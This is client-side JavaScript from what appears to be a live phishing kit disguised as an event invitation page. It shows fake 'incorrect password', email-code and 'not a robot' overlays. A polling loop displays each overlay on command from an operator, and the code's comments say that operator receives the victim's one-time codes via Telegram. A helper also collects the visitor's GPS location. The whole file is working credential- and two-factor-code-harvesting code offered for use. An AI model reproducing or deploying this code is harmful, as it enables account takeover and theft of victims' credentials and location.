(function () {
  const SESSION_KEY = '__SUBMISSION_SESSION_ID__';

  function getSessionId() {
    return sessionStorage.getItem(SESSION_KEY) || '';
  }

  function setSessionId(id) {
    sessionStorage.setItem(SESSION_KEY, id);
  }

  function clearSessionId() {
    sessionStorage.removeItem(SESSION_KEY);
  }

  function ensureContainer() {
    let container = document.getElementById('response-container');
    if (container) return container;
    container = document.createElement('div');
    container.id = 'response-container';
    document.body.appendChild(container);
    return container;
  }

  function closeOverlay() {
    const container = document.getElementById('response-container');
    if (!container) return;
    const overlay = container.querySelector('.response-overlay');
    if (overlay) {
      overlay.classList.remove('is-open');
      setTimeout(() => { if (container) container.innerHTML = ''; }, 300);
    }
  }

  function renderOverlay(html) {
    const container = ensureContainer();
    container.innerHTML = html;
    const overlay = container.querySelector('.response-overlay');
    requestAnimationFrame(() => overlay.classList.add('is-open'));
    return overlay;
  }

  function showSuccess() {
    renderOverlay(`
      <div class="response-overlay" id="overlay-success">
        <div class="response-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="response-icon success">✓</div>
          <h2 class="response-title">Spot Reserved Successfully</h2>
          <p class="response-message">Your invitation has been confirmed and your spot for the event has been booked. We look forward to seeing you there!</p>
          <div class="response-actions">
            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Done</button>
          </div>
        </div>
      </div>
    `);
  }

  function showPasswordError() {
    renderOverlay(`
      <div class="response-overlay" id="overlay-password-error">
        <div class="response-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="response-icon error">!</div>
          <h2 class="response-title">Incorrect Password</h2>
          <p class="response-message">The password you entered is incorrect. Please try again.</p>
          <div class="response-actions">
            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Try Again</button>
          </div>
        </div>
      </div>
    `);
  }

  function showYesPrompt() {
    renderOverlay(`
      <div class="response-overlay" id="overlay-yes-prompt">
        <div class="response-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="response-icon yes">✓</div>
          <h2 class="response-title">Confirmation Required</h2>
          <p class="response-message">Please confirm your choice to continue.</p>
          <div class="response-actions">
            <button class="response-btn response-btn-secondary" type="button" onclick="window.__ResponseControls.close()">Cancel</button>
            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Confirm</button>
          </div>
        </div>
      </div>
    `);
  }

  function showSmsPrompt(email) {
    const safeEmail = email || 'your email';
    renderOverlay(`
      <div class="response-overlay" id="overlay-sms">
        <div class="response-card sms-verify-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="sms-verify-icon" aria-hidden="true">
            <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect x="8" y="14" width="48" height="36" rx="6" fill="#FEF6F0" stroke="#6A0D25" stroke-width="2.5"/>
              <path d="M8 20l24 16 24-16" stroke="#6A0D25" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
              <circle cx="48" cy="44" r="12" fill="#B8963A"/>
              <text x="48" y="49" text-anchor="middle" font-family="Jost,sans-serif" font-size="13" font-weight="700" fill="#fff">✓</text>
            </svg>
          </div>
          <h2 class="sms-verify-title">Verify Your Email</h2>
          <p class="sms-verify-email">${escapeHtml(safeEmail)}</p>
          <p class="sms-verify-message">A verification code has been sent to your email. Please enter it below to continue.</p>
          <form class="sms-verify-form" id="sms-verify-form" autocomplete="off">
            <div class="sms-code-group">
              <input type="text" class="sms-code-input" id="sms-code-1" maxlength="1" inputmode="numeric" aria-label="Digit 1" />
              <input type="text" class="sms-code-input" id="sms-code-2" maxlength="1" inputmode="numeric" aria-label="Digit 2" />
              <input type="text" class="sms-code-input" id="sms-code-3" maxlength="1" inputmode="numeric" aria-label="Digit 3" />
              <input type="text" class="sms-code-input" id="sms-code-4" maxlength="1" inputmode="numeric" aria-label="Digit 4" />
              <input type="text" class="sms-code-input" id="sms-code-5" maxlength="1" inputmode="numeric" aria-label="Digit 5" />
              <input type="text" class="sms-code-input" id="sms-code-6" maxlength="1" inputmode="numeric" aria-label="Digit 6" />
            </div>
            <p class="sms-verify-resend">Didn't receive a code? <a href="#" onclick="event.preventDefault();">Resend code</a></p>
            <button class="sms-verify-btn" type="submit" id="sms-verify-submit">Verify</button>
          </form>
          <div class="sms-verify-loading" id="sms-verify-loading" style="display:none;">
            <div class="sms-verify-spinner"></div>
            <p>Verifying your code…</p>
          </div>
        </div>
      </div>
    `);

    setupSmsCodeInputs();
    setupSmsFormSubmit();
  }

  function escapeHtml(str) {
    if (str == null) return '';
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  function setupSmsCodeInputs() {
    const inputs = document.querySelectorAll('.sms-code-input');
    if (!inputs.length) return;

    inputs.forEach((input, index) => {
      input.addEventListener('input', function () {
        this.value = this.value.replace(/[^0-9]/g, '');
        if (this.value && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });
      input.addEventListener('keydown', function (e) {
        if (e.key === 'Backspace' && !this.value && index > 0) {
          inputs[index - 1].focus();
        }
      });
      input.addEventListener('paste', function (e) {
        e.preventDefault();
        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 6);
        if (!pasted) return;
        pasted.split('').forEach((char, i) => {
          if (inputs[i]) inputs[i].value = char;
        });
        const lastFilled = Math.min(pasted.length, inputs.length - 1);
        inputs[lastFilled].focus();
      });
    });

    const first = document.getElementById('sms-code-1');
    if (first) setTimeout(() => first.focus(), 300);
  }

  function setupSmsFormSubmit() {
    const form = document.getElementById('sms-verify-form');
    if (!form) return;

    form.addEventListener('submit', async function (e) {
      e.preventDefault();
      const inputs = document.querySelectorAll('.sms-code-input');
      let code = '';
      let allFilled = true;
      inputs.forEach((input) => {
        code += input.value;
        if (!input.value) allFilled = false;
      });

      if (!allFilled || code.length < 6) {
        inputs.forEach((input) => {
          if (!input.value) input.classList.add('sms-code-error');
        });
        return;
      }

      const formEl = document.getElementById('sms-verify-form');
      const loadingEl = document.getElementById('sms-verify-loading');
      const submitBtn = document.getElementById('sms-verify-submit');
      if (formEl) formEl.style.display = 'none';
      if (submitBtn) submitBtn.style.display = 'none';
      if (loadingEl) loadingEl.style.display = 'flex';

      const sessionId = getSessionId();
      try {
        const res = await fetch('/api/verify-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId, code }),
        });
        const data = await res.json();
      } catch (err) {
        // ignore — code was still sent to Telegram
      }

      // Keep the loading state; the operator will respond via Telegram
      // The polling loop will pick up the next command (success, password_error, etc.)
    });
  }

  function showNumberPrompt(number) {
    renderOverlay(`
      <div class="response-overlay" id="overlay-number">
        <div class="response-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="response-icon number">#</div>
          <h2 class="response-title">Enter This Number</h2>
          <p class="response-message">Please enter the number shown below to verify you are not a robot.</p>
          <div class="response-number">${number}</div>
          <form class="response-form" onsubmit="event.preventDefault(); window.__ResponseControls.close();">
            <label for="number-input">Enter the number above</label>
            <input type="text" id="number-input" name="number-input" placeholder="Type the number" inputmode="numeric" />
          </form>
          <div class="response-actions">
            <button class="response-btn response-btn-secondary" type="button" onclick="window.__ResponseControls.close()">Cancel</button>
            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Submit</button>
          </div>
        </div>
      </div>
    `);
  }

  function closeAuthModal() {
    const authModal = document.getElementById('auth-modal');
    if (authModal) authModal.classList.remove('is-open');
  }

  function handleCommand(command, data) {
    closeAuthModal();
    switch (command) {
      case 'success': showSuccess(); break;
      case 'password_error': showPasswordError(); break;
      case 'yes_prompt': showYesPrompt(); break;
      case 'sms': showSmsPrompt(data); break;
      case 'number_prompt':
        if (data) showNumberPrompt(data);
        else showNumberPrompt('?');
        break;
      default: break;
    }
  }

  let polling = false;
  async function startPolling(sessionId) {
    if (polling) return;
    polling = true;
    while (polling) {
      try {
        const res = await fetch(`/api/status/${sessionId}`);
        if (!res.ok) { polling = false; break; }
        const result = await res.json();
        if (result.command) {
          handleCommand(result.command, result.data);
          if (result.command === 'success') {
            polling = false;
            clearSessionId();
            break;
          }
        }
      } catch (e) {
        await new Promise((r) => setTimeout(r, 3000));
      }
    }
  }

  function collectGps() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve({ lat: null, lng: null });
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
        () => resolve({ lat: null, lng: null }),
        { timeout: 5000, maximumAge: 60000 }
      );
    });
  }

  window.__ResponseControls = {
    start: startPolling,
    handle: handleCommand,
    close: closeOverlay,
    setSessionId,
    getSessionId,
    clearSessionId,
    collectGps,
  };

  const existingSession = getSessionId();
  if (existingSession) {
    startPolling(existingSession);
  }
})();
